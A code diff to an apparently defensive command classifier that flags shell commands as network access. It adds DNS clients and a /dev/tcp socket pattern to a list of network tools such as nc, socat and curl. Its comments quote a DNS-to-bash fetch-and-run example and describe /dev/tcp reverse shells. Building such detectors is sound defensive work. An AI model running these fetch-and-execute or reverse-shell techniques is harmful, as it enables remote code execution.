@@ -708,6 +708,10 @@ _INTERPRETERS = {
 _NET_TOOLS = {
     "curl", "wget", "aria2c", "aria2", "httpie", "http", "https", "certutil",
     "scp", "sftp", "rsync", "ftp", "tftp", "telnet", "nc", "ncat", "socat", "ssh",
+    # DNS clients. A TXT/ANY lookup is a network fetch and can smuggle an
+    # execution payload the way a web fetch can (`dig +short TXT x | bash`).
+    # See threat-register.md, DNS-client and /dev/tcp detection.
+    "dig", "nslookup", "host", "drill", "kdig",
 }
 _VCS_TOOLS = {"git", "svn", "hg"}
 _VCS_NET_SUBCOMMANDS = {"clone", "pull", "fetch", "push", "remote", "ls-remote", "submodule"}
@@ -721,6 +725,11 @@ _CODE_FLAGS = {"-c", "-e", "-m", "--eval", "--exec", "--command", "-E"}
 # Interpreters that take an inline program as a bare positional argument.
 _PROGRAM_INTERPRETERS = {"awk", "gawk", "mawk", "perl", "ruby", "osascript", "lua", "rscript", "pwsh", "powershell"}
 _SCRIPT_EXTENSION = re.compile(r"\.(?:py|js|ts|mjs|cjs|rb|pl|php|sh|bash|lua|r|tcl|ps1|awk)$", re.IGNORECASE)
+# bash/ksh /dev/tcp and /dev/udp pseudo-devices open a socket with no network
+# client on the command line: the classic dependency-free reverse shell. Treat
+# their presence as network access so the redirect is not invisible to the
+# class check.
+_DEV_SOCKET = re.compile(r"/dev/(?:tcp|udp)/")
 
 
 def _command_head(segment: str) -> tuple[str, list[str]]:
@@ -743,6 +752,8 @@ def _command_segments(command: str) -> list[str]:
 
 
 def _segment_is_networked(segment: str) -> bool:
+    if _DEV_SOCKET.search(segment):
+        return True
     head, args = _command_head(segment)
     if head in _VCS_TOOLS:
         return any(arg in _VCS_NET_SUBCOMMANDS for arg in args)
